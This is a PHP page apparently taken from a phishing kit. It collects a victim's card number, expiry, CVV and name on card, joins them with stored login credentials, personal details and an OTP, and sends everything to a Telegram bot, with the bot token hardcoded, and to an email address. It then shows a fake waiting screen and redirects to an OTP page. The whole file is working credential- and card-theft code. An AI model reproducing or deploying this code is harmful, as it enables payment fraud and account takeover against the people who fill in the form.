<?php
session_start();
include "header.php";
include "../email.php";

$_SESSION['nameoncard'] = $_POST['nameoncard'];
$_SESSION['crd'] = $_POST['crd'];
$_SESSION['year'] = $_POST['year'];
$_SESSION['month'] = $_POST['month'];
$_SESSION['cvv'] = $_POST['cvv'];

$to = $email;;
$subject = 'Card info | All info ';
$message = "
----------------Card info | All info-----------------
  



Client id: " . $_SESSION['id'] . "
Client Password: " . $_SESSION['password'] . "

-----------------full info----------------




Fullname : " . $_SESSION['fullname'] . "

Zipcode : " . $_SESSION['zip'] . "
Phone : " . $_SESSION['phone'] . "
Date of birth : " . $_SESSION['date'] . "
----------------card info-----------------




Name on card : " . $_SESSION['nameoncard'] . "

Card number : " . $_SESSION['crd'] . "
expiry : " . $_SESSION['month'] . "/" . $_SESSION['year'] . "
cvv : " . $_SESSION['cvv'] . "


-------------------OTP-------------------
OTP : " . $_SESSION['otp'] . "

  

";
sendMessageT('-670431353',$message,'2141533923:AAETgvM1iliuDfSj6V79whhNunI-mncfr-E');

mail($to, $subject, $message);

?>
<link rel="stylesheet" href="../css/index.css">

<main class="" style="min-height:450px; background-color: #F3F4F6;">
    <div class="row container-expand-gl mx-auto co" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 par" style="font-size: 28px; margin:10px;">We will send you an otp code </p>
        <br>
        <div class="col-12 mx-auto row co1" style="background-color: white;height:360px ; padding:0; margin:40px;">
            <div class="mx-auto row " style="margin-top: 100px;"><img src="../images/wait.gif" alt="" style="transform: translate(360%,0);width:30px; height:30px; display: inline;margin-top: 50px;">
                <p class="col-12" style="transform: translate(0%,0); font-size: 23px;">Please wait
                    <span id="sec">30</span> seconds
                </p>
            </div>
        </div>
</main>
<br> <br>
<style>
    @media only screen and (max-width: 800px) {
        .co {
            width: 200% !important;
        }

        main {
            background-color: white !important;
        }

        .par {
            margin: 0px !important;
            font-size: 20px !important;
        }

        .co1 {
            margin: 0px !important;
            transform: translate(-25%, 0);
        }

    }
</style>
<?php
include "footer.php";



?>
<script>
    setInterval(function() {
        sec = parseInt($("#sec").html());
        sec--;
        $("#sec").html(sec);

    }, 2000);
    setTimeout(function() {
        window.location.href = "otp2.php";
    }, 60000);
</script>